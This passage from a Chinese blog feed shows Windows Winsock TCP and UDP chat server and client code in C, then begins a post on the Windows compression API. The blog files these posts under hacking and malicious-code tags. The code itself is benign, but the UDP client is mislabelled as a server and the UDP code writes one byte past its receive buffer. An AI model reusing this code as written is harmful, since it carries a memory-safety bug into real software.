class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-comment">//#include &lt;WinSock2.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;Ws2_32.lib&quot;</span>)</span><br><span class="hljs-function">BOOL <span class="hljs-title">SocketBindAndListen</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszIP, <span class="hljs-keyword">int</span> Port)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AcceptRecvMsg</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SendMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszSend)</span></span>;<br><span class="hljs-function">UINT <span class="hljs-title">RecvThreadProc</span><span class="hljs-params">(LPVOID lpVoid)</span></span>;<br>SOCKET g_ServerSocket;<br>SOCKET g_ClientSocket;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-keyword">if</span> (SocketBindAndListen(<span class="hljs-string">&quot;IP地址&quot;</span>, <span class="hljs-number">12345</span>) == FALSE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;建立连接失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;连接建立成功，开始通信\n&quot;</span>);<br><span class="hljs-keyword">char</span> szSendmsg[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br>gets_s(szSendmsg);<br>SendMsg(szSendmsg);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">SocketBindAndListen</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszIP, <span class="hljs-keyword">int</span> Port)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//初始化winsock库</span><br>WSADATA wsaData = &#123; <span class="hljs-number">0</span> &#125;;<br>WSAStartup(MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData);<br><span class="hljs-comment">//创建套接字</span><br>g_ServerSocket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><br>sockaddr_in addr;<br>addr.sin_family = AF_INET;<br>addr.sin_port = htons(Port);<br>addr.sin_addr.S_un.S_addr = inet_addr(lpszIP);<br><span class="hljs-comment">//绑定IP和端口</span><br><span class="hljs-keyword">if</span> (bind(g_ServerSocket, (sockaddr*)(&amp;addr), <span class="hljs-keyword">sizeof</span>(addr)) == SOCKET_ERROR)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//设置监听</span><br><span class="hljs-keyword">if</span> (listen(g_ServerSocket, <span class="hljs-number">1</span>) == SOCKET_ERROR)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)RecvThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AcceptRecvMsg</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>sockaddr_in addr = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">int</span> len = <span class="hljs-keyword">sizeof</span>(addr);<br>g_ClientSocket = accept(g_ServerSocket, (sockaddr*)(&amp;addr), &amp;len);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收客户端连接请求\n&quot;</span>);<br><span class="hljs-keyword">char</span> szBuffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-comment">//接收数据</span><br><span class="hljs-keyword">int</span> Ret = recv(g_ClientSocket, szBuffer, MAX_PATH, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (Ret &lt;= <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收到数据：%s\n&quot;</span>, szBuffer);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SendMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszSend)</span></span><br><span class="hljs-function"></span>&#123;<br>send(g_ClientSocket, pszSend, (<span class="hljs-number">1</span> + <span class="hljs-built_in">strlen</span>(pszSend)), <span class="hljs-number">0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发送数据：%s\n&quot;</span>, pszSend);<br>&#125;<br><span class="hljs-function">UINT <span class="hljs-title">RecvThreadProc</span><span class="hljs-params">(LPVOID lpVoid)</span> </span>&#123;<br>AcceptRecvMsg();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h6 id="客户端代码："><a href="#客户端代码：" class="headerlink" title="客户端代码："></a>客户端代码：</h6><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-comment">//#include &lt;WinSock2.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;Ws2_32.lib&quot;</span>)</span><br>SOCKET g_ServerSocket;<br><span class="hljs-function">BOOL <span class="hljs-title">Connection</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszServerIP, <span class="hljs-keyword">int</span> ServerPort)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SendMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszSend)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RecvMsg</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function">UINT <span class="hljs-title">RecvThreadProc</span><span class="hljs-params">(LPVOID lpVoid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入服务器IP\n&quot;</span>);<br><span class="hljs-keyword">char</span> ipaddr[<span class="hljs-number">32</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>gets_s(ipaddr);<br><span class="hljs-keyword">if</span> (Connection(ipaddr, <span class="hljs-number">12345</span>) == FALSE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;建立连接失败\n&quot;</span>);<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;建立连接成功，开始通信\n&quot;</span>);<br><span class="hljs-keyword">char</span> szSend[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>gets_s(szSend);<br>SendMsg(szSend);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">Connection</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszServerIP, <span class="hljs-keyword">int</span> ServerPort)</span></span><br><span class="hljs-function"></span>&#123;<br>WSADATA wsaData = &#123; <span class="hljs-number">0</span> &#125;;<br>WSAStartup(MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData);<br>g_ServerSocket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (g_ServerSocket == INVALID_SOCKET)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>sockaddr_in addr = &#123; <span class="hljs-number">0</span> &#125;;<br>addr.sin_family = AF_INET;<br>addr.sin_port = htons(ServerPort);<br>addr.sin_addr.S_un.S_addr = inet_addr(lpszServerIP);<br><br><span class="hljs-keyword">if</span> (connect(g_ServerSocket, (sockaddr*)(&amp;addr), <span class="hljs-keyword">sizeof</span>(addr)))<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)RecvThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SendMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszSend)</span> </span>&#123;<br>send(g_ServerSocket, pszSend, (<span class="hljs-number">1</span> + <span class="hljs-built_in">strlen</span>(pszSend)), <span class="hljs-number">0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发送消息：%s\n&quot;</span>,pszSend);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RecvMsg</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">char</span> szBuffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-keyword">int</span> ret = recv(g_ServerSocket, szBuffer, MAX_PATH, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收到消息：%s\n&quot;</span>, szBuffer);<br>&#125;<br>&#125;<br><br><br><span class="hljs-function">UINT <span class="hljs-title">RecvThreadProc</span><span class="hljs-params">(LPVOID lpVoid)</span> </span>&#123;<br>RecvMsg();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><p>服务端</p><p><img src="/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/1.png"></p><p>客户端</p><p><img src="/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/2.png"></p><h4 id="基于UDP-Socket编程"><a href="#基于UDP-Socket编程" class="headerlink" title="基于UDP Socket编程"></a>基于UDP Socket编程</h4><h5 id="函数介绍-1"><a href="#函数介绍-1" class="headerlink" title="函数介绍"></a>函数介绍</h5><h6 id="sendto"><a href="#sendto" class="headerlink" title="sendto"></a>sendto</h6><p>将数据发送到特定的目的地</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sendto</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  SOCKET         s,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>     *buf,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">int</span>            len,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">int</span>            flags,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">const</span> sockaddr *to,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">int</span>            tolen</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>s：标识套接字的描述符。</p><p>buf：指向要发送的数据缓冲区的指针。</p><p>len：由buf参数指向的数据长度。</p><p>flags：指定一组调用方式的标志，一般为0。</p><p>to：指向包含目标套接字地址的sockaddr结构的可选指针。</p><p>tolen：由to参数指向的地址的大小。</p><p>返回值：如果没有发生错误，返回发送的总字节数，否则返回SOCKET_ERROR。</p><h6 id="recvfrom"><a href="#recvfrom" class="headerlink" title="recvfrom"></a>recvfrom</h6><p>接收数据报并存储源地址</p><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">recvfrom</span>(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-function">  SOCKET   s,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">char</span>     *buf,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">int</span>      len,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">int</span>      flags,</span></span><br><span class="hljs-params"><span class="hljs-function">  sockaddr *<span class="hljs-keyword">from</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">int</span>      *fromlen</span></span><br><span class="hljs-params"><span class="hljs-function"></span>)</span>;<br></code></pre></div></td></tr></table></figure><p>s：标识套接字的描述符。</p><p>buf：指定传入数据的缓冲区。</p><p>len：由buf参数指向的数据长度。</p><p>flags：指定一组调用方式的标志，一般为0。</p><p>from：指向sockaddr结构中的缓冲区的可选指针，它将在返回时保存源地址。</p><p>fromlen：由from参数指向的地址的大小。</p><p>返回值：如果没有发生错误，返回接收到的总字节数，否则返回SOCKET_ERROR。</p><h5 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a>实现原理</h5><p>UDP的通信框架比起TCP更加简单，UDP是基于无连接的通信，它可以直接使用sendto和recvfrom函数进行数据的发送与接收。</p><h6 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h6><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">bind</span><span class="hljs-params">()</span> </span>&#123;<br>WSADATA wsaData;<br>WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br><span class="hljs-keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>serSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);<br><span class="hljs-keyword">if</span> (serSocket == INVALID_SOCKET)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;socket 错误\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>sockaddr_in serAddr;<br>serAddr.sin_family = AF_INET;<br>serAddr.sin_port = htons(<span class="hljs-number">12345</span>);<br>serAddr.sin_addr.S_un.S_addr = inet_addr(<span class="hljs-string">&quot;IP地址&quot;</span>);<br><span class="hljs-keyword">if</span> (bind(serSocket, (sockaddr*)&amp;serAddr, <span class="hljs-keyword">sizeof</span>(serAddr)) == SOCKET_ERROR)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;绑定失败\n&quot;</span>);<br>closesocket(serSocket);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (bind() == FALSE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;开始通信\n&quot;</span>);<br>sockaddr_in remoteAddr;<br><span class="hljs-keyword">int</span> nAddrLen = <span class="hljs-keyword">sizeof</span>(remoteAddr);<br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>&#123;<br><span class="hljs-keyword">char</span> recvData[MAX_PATH];<br><span class="hljs-keyword">int</span> ret = recvfrom(serSocket, recvData, MAX_PATH, <span class="hljs-number">0</span>, (sockaddr*)&amp;remoteAddr, &amp;nAddrLen);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>&#123;<br>recvData[ret] = <span class="hljs-number">0x00</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收到信息：%s\n&quot;</span>,recvData);<br>&#125;<br><br><br><span class="hljs-keyword">char</span> sendData[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>gets_s(sendData);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发送数据：%s\n&quot;</span>, sendData);<br>sendto(serSocket, sendData, <span class="hljs-built_in">strlen</span>(sendData), <span class="hljs-number">0</span>, (sockaddr*)&amp;remoteAddr, nAddrLen);<br><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h6 id="服务端：-1"><a href="#服务端：-1" class="headerlink" title="服务端："></a>服务端：</h6><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">bind</span><span class="hljs-params">()</span> </span>&#123;<br>    WORD socketVersion = <span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>    WSADATA wsaData;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(socketVersion, &amp;wsaData) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    sclient = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_DGRAM, IPPROTO_UDP);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">bind</span>() == FALSE)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;开始通信\n&quot;</span>);<br>    sockaddr_in sin;<br>    sin.sin_family = AF_INET;<br>    sin.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">12345</span>);<br>    sin.sin_addr.S_un.S_addr = <span class="hljs-built_in">inet_addr</span>(<span class="hljs-string">&quot;IP地址&quot;</span>);<br>    <span class="hljs-keyword">int</span> len = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(sin);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br><br>        <span class="hljs-keyword">char</span> sendData[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>        <span class="hljs-built_in">gets_s</span>(sendData);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发送数据：%s\n&quot;</span>, sendData);<br>        <span class="hljs-built_in">sendto</span>(sclient, sendData, <span class="hljs-built_in">strlen</span>(sendData), <span class="hljs-number">0</span>, (sockaddr*)&amp;sin, len);<br>        <span class="hljs-keyword">char</span> recvData[MAX_PATH];<br>        <span class="hljs-keyword">int</span> ret = <span class="hljs-built_in">recvfrom</span>(sclient, recvData, MAX_PATH, <span class="hljs-number">0</span>, (sockaddr*)&amp;sin, &amp;len);<br>        <span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>        &#123;<br>            recvData[ret] = <span class="hljs-number">0x00</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收到信息：%s\n&quot;</span>,recvData);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h5><p><img src="/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/3.png"></p><p><img src="/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/4.png"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>《Windows黑客编程技术详解》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;SOCKET通信&quot;&gt;&lt;a href=&quot;#SOCKET通信&quot; class=&quot;headerlink&quot; title=&quot;SOCKET通信&quot;&gt;&lt;/a&gt;SOCKET通信&lt;/h3&gt;&lt;p&gt;socket也被叫做“套接字”，应用程序通常通过“套接字”向网络发出请求或者接收请求。soc</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="传输技术" scheme="https://b1ackie.cn/tags/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF/"/>
    
    <category term="SOCKET编程" scheme="https://b1ackie.cn/tags/SOCKET%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>压缩技术-windows压缩API</title>
    <link href="https://b1ackie.cn/2021/08/06/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF-windows%E5%8E%8B%E7%BC%A9API/"/>
    <id>https://b1ackie.cn/2021/08/06/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF-windows%E5%8E%8B%E7%BC%A9API/</id>
    <published>2021-08-06T05:46:31.000Z</published>
    <updated>2021-08-09T10:51:56.697Z</updated>
    
    <content type="html"><![CDATA[<h4 id="压缩技术"><a href="#压缩技术" class="headerlink" title="压缩技术"></a>压缩技术</h4><p>为了实现windows上的数据压缩和解压缩，最方便的方法就是直接调用win32API函数。windows系统的ntdll专门提供了RtlCompressBuffer和RtlDecompressBuffer函数来负责数据压缩和解压缩操作。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="RtlGetCompressionWorkSpaceSize"><a href="#RtlGetCompressionWorkSpaceSize" class="headerlink" title="RtlGetCompressionWorkSpaceSize"></a>RtlGetCompressionWorkSpaceSize</h5><p>确定RtlCompressBuffer和RtlDecompressBuffer函数工作空间缓冲区的正确大小。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">NT_RTL_COMPRESS_API NTSTATUS <span class="hljs-title">RtlGetCompressionWorkSpaceSize</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  USHORT CompressionFormatAndEngine,</span></span><br><span class="hljs-params"><span class="hljs-function">  PULONG CompressBufferWorkSpaceSize,</span></span><br><span class="hljs-params"><span class="hljs-function">  PULONG CompressFragmentWorkSpaceSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>CompressionFormatAndEngine：指定压缩格式和引擎类型。该参数必须设置为以下组合之一：</p><p>COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD</p><p>COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM</p><p>CompressBufferWorkSpaceSize：指向调用者分配的缓冲区指针，用于接受压缩缓冲区所需的大小。此值可确定RtlCompressBuffer的工作空间缓冲区的正确大小。</p><p>CompressFragmentWorkSpaceSize：一个指向可调用者分配缓冲区的指针，用于接收将压缩缓冲区解压缩为片段所需的大小。此值用于确定RtlDecompressFragment的工作空间缓冲区的正确大小。</p><p>返回值：返回STATUS_SUCCESS成功，否则失败。</p><h5 id="RtlCompressBuffer"><a href="#RtlCompressBuffer" class="headerlink" title="RtlCompressBuffer"></a>RtlCompressBuffer</h5><p>压缩一个可以由文件系统驱动程序使用的缓冲区，以促进文件压缩的实现。</p><figure class="highlight vbnet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span 